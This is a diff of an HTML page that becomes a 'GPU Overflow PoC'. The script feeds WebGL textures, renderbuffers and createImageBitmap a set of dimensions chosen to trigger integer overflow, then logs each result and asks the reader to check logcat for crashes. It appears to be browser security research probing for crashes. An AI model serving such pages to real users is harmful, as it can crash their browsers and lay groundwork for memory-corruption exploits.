@@ -1,38 +1,92 @@
 <!DOCTYPE html>
 <html>
 <body>
-<canvas id="c"></canvas>
+<h1>GPU Overflow PoC</h1>
+<pre id="log"></pre>
 <script>
 (async function() {
-  const offscreen = new OffscreenCanvas(4096, 4096);
+  const log = (msg) => {
+    document.getElementById('log').textContent += msg + '\n';
+    console.log(msg);
+  };
+
+  // Helper to test a specific texture dimension
+  async function testWebGLTexture(gl, width, height) {
+    try {
+      const tex = gl.createTexture();
+      gl.bindTexture(gl.TEXTURE_2D, tex);
+      gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, width, height, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+      const fb = gl.createFramebuffer();
+      gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
+      const rb = gl.createRenderbuffer();
+      gl.bindRenderbuffer(gl.RENDERBUFFER, rb);
+      gl.renderbufferStorage(gl.RENDERBUFFER, gl.RGBA8, width, height);
+      gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.RENDERBUFFER, rb);
+      const buf = new Uint8Array(4);
+      gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, buf);
+      log(`WebGL texture ${width}x${height} succeeded`);
+    } catch(e) {
+      log(`WebGL texture ${width}x${height} error: ${e.message}`);
+    }
+  }
+
+  // Helper to try createImageBitmap with resize
+  async function testImageBitmap(width, height) {
+    try {
+      const canvas = new OffscreenCanvas(1, 1);
+      const ctx = canvas.getContext('2d');
+      ctx.fillStyle = 'red';
+      ctx.fillRect(0, 0, 1, 1);
+      const blob = await canvas.convertToBlob();
+      const bitmap = await createImageBitmap(blob, {resizeWidth: width, resizeHeight: height});
+      log(`createImageBitmap ${width}x${height} succeeded, bitmap: ${bitmap.width}x${bitmap.height}`);
+      bitmap.close();
+    } catch(e) {
+      log(`createImageBitmap ${width}x${height} error: ${e.message}`);
+    }
+  }
+
+  // Set up WebGL context
+  const offscreen = new OffscreenCanvas(256, 256);
   const gl = offscreen.getContext('webgl2', {
     powerPreference: 'high-performance',
     failIfMajorPerformanceCaveat: false
   });
   if (!gl) {
-    document.body.innerHTML += '<p>WebGL2 not supported</p>';
+    log('WebGL2 not supported');
     return;
   }
+  const maxSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+  log(`MAX_TEXTURE_SIZE = ${maxSize}`);
 
-  const maxTexSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
-  const bigSize = Math.min(maxTexSize, 16384);
+  // Candidate dimensions: some cause overflow, some are huge but valid
+  const testCases = [
+    // Integer overflow candidates (46341*46341*4 wraps to ~4)
+    {w: 46341, h: 46341},
+    {w: 65536, h: 65536},
+    // Large but within limits to stress memory
+    {w: maxSize, h: maxSize},
+    {w: maxSize/2, h: maxSize*2},
+    // Edge cases
+    {w: 1, h: 0xFFFFFFFF},
+    {w: 0xFFFF, h: 0xFFFF},
+    // Overly large single dimensions
+    {w: 16384, h: 262144},
+    {w: 262144, h: 1}
+  ];
 
-  // Allocate several huge textures to really stress the system
   for (let i = 0; i < 5; i++) {
-    const tex = gl.createTexture();
-    gl.bindTexture(gl.TEXTURE_2D, tex);
-    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, bigSize, bigSize, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-    const fb = gl.createFramebuffer();
-    gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
-    const rb = gl.createRenderbuffer();
-    gl.bindRenderbuffer(gl.RENDERBUFFER, rb);
-    gl.renderbufferStorage(gl.RENDERBUFFER, gl.RGBA8, bigSize, bigSize);
-    gl.framebufferRenderbuffer(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.RENDERBUFFER, rb);
-    const buf = new Uint8Array(4);
-    gl.readPixels(0, 0, 1, 1, gl.RGBA, gl.UNSIGNED_BYTE, buf);
+    for (const test of testCases) {
+      // Skip if dimensions exceed MAX_TEXTURE_SIZE? We'll still try, some implementations may not clamp.
+      await testWebGLTexture(gl, test.w, test.h);
+      await new Promise(r => setTimeout(r, 50));
+    }
+    // Also try imageBitmap variant
+    await testImageBitmap(65536, 65536);
+    await testImageBitmap(46341, 46341);
   }
 
-  console.log('Allocated ' + 5 + ' huge textures of size ' + bigSize + 'x' + bigSize);
+  log('All tests completed. Check logcat for crashes.');
 })();
 </script>
 </body>
